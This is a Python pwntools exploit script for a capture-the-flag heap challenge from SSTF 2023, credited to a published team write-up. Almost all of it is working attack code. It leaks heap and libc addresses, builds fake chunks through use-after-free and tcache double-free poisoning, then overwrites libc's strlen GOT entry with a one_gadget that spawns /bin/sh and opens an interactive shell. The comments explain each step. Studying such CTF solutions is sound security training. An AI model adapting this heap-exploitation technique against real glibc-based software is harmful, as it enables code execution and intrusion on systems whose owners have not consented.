#!/usr/bin/env python3

# type: ignore
# flake8: noqa

"""
Solution based on The Duck team (1st in SSTF 2023)
https://github.com/theori-io/ctf/blob/master/2023/SSTF2023/SSTF%202023%20The%20Duck%20-%20Write%20Up.pdf
"""

from pwn import *

elf = context.binary = ELF("./chal_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def reveal(ptr):
    mask = 0xfff << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def demangle(pos, ptr):
    return (pos >> 12) ^ ptr


def _add(idx, data):
    io.sendlineafter(b"cmd: ", b"1")
    io.sendline(str(idx).encode())
    io.sendline(data)


def _del(idx):
    io.sendlineafter(b"cmd: ", b"2")
    io.sendline(str(idx).encode())


def _print():
    io.sendlineafter(b"cmd: ", b"3")


##########
# Leak heap base
##########

_add(0, b"aaaaaaaa")
_add(1, b"bbbbbbbb")
_del(0)
_del(1)
_print()
leak_heap = reveal(u64(io.recvline(keepends=False)[2:].ljust(8, p8(0))))
heap_base = leak_heap - 0x2a0
log.info(f"{heap_base=:#x}")

##########
# Create a fake chunk of size 0x430
##########

payload = flat(0, 0x431)

# setup for fake chunk metadata of size 0x430 @ heap_base+0x2c0
_add(2, payload)

_add(3, b"c" * 0x8)
_add(4, b"d" * 0x8)
_del(3)
_add(3, b"e" * 0x10)  # UAF and overwrite tcache key
_del(3)  # double free

"""
Although the pointer location is not on `heap_base` (`mangle` 1st argument),
we can use `heap_base` as this pointer location is located on the same memory
page. Hence, the actual pointer location >> 12 is equal to `heap_base` >> 12
"""

# prepare a fake free chunk on tcachebins located at address heap_base+0x2d0
# which has the fake size of 0x430 created previously
_add(3, p64(mangle(heap_base, heap_base + 0x2d0)))  # UAF

# pause()
_add(6, b"f" * 0x10)

# fake chunk created from tcachebins at address heap_base+0x2d0 (data address
# not chunk address)
_add(7, b"g" * 0x8)

##########
# Create a fake chunk of size 0x20 after the previous fake 0x430 size chunk
##########

"""
Without this fake chunk and the next fake chunk created
> double free or corruption (!prev)
"""

_add(8, b"h" * 0x8)
_add(9, b"i" * 0x8)
_del(8)
_add(8, b"j" * 0x10)  # UAF and overwrite tcache key
_del(8)  # double free

# prepare a fake free chunk on tcachebins located at address heap_base+0x6f0
# 0x6f0 comes from 0x2c0 + 0x430
_add(8, p64(mangle(heap_base, heap_base + 0x6f0)))  # UAF

_add(10, b"k" * 0x8)

"""
fake chunk created from tcachebins at address heap_base+0x6f0 (data address not
chunk address)
this creates a fake chunk metadata (the next chunk after the 0x430 size chunk @
heap_base+0x2c0)
"""
payload = flat(0, 0x21)
_add(11, payload)

##########
# Create a fake chunk of size 0x20 after the previous fake 0x20 size chunk
##########

"""
Without this fake chunk but the previous fake chunk created
> corrupted size vs. prev_size
"""

_add(12, b"l" * 0x8)
_add(13, b"m" * 0x8)
_del(12)
_add(12, b"n" * 0x10)  # UAF and overwrite tcache key
_del(12)

_add(12, p64(mangle(heap_base, heap_base + 0x710)))
_add(13, b"o" * 0x8)
_add(14, b"p" * 0x8)

payload = flat(0, 0x21)
"""
fake chunk created from tcachebins at address heap_base+0x710 (data address not
chunk address)
this creates a fake chunk metadata (the next chunk after the chunk @
heap_base+0x6f0)
"""
_add(15, payload)

##########
# Free the fake 0x430 size chunk to unsortedbin
##########

"""
free the fake chunk of size 0x430, this goes into unsortedbin and both the fd
and bk field (because unsortedbin is doubly-linked list) is populated with the
main_arena address (which is an address inside libc)
"""
_del(7)

_print()
io.recvuntil(b"->")
io.recvuntil(b"->")
io.recvuntil(b"->")
io.recvuntil(b"->")
libc_leak = u64(io.recv(6).ljust(8, p8(0)))
libc.address = libc_leak - 0x219ce0
assert libc.address & 0xfff == 0
log.info(f"{libc.address=:#x}")

strlen_got = libc.address + 0x219090

"""
this one_gadget works even though rdx and [rdx] is not NULL
perhaps because it is the third argument (envp) and does not really matter?

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL
"""
one_gadget = libc.address + 0xebcf5

##########
# Overwrite libc strlen GOT
##########

_add(16, b"q" * 0x8)
_add(17, b"r" * 0x8)
_del(16)
_add(16, b"s" * 0x10)  # UAF
_del(16)  # double free
_add(16, p64(mangle(heap_base, strlen_got)))  # UAF
_add(18, b"t" * 0x8)
pause()

# strlen GOT is actually at libc.address + 0x219090 + 0x8
# however, due to malloc alignment issue, we cannot allocate address ending
# with 0x8
# Thus, we just write 16 bytes of data at libc.address + 0x219090
_add(19, p64(one_gadget) * 2)

log.info(f"{strlen_got=:#x}")
log.info(f"{one_gadget=:#x}")

"""
The strlen GOT is triggered by printf and not strlen?
Specifically inside `__vfprintf_internal+7420`
"""

io.interactive()
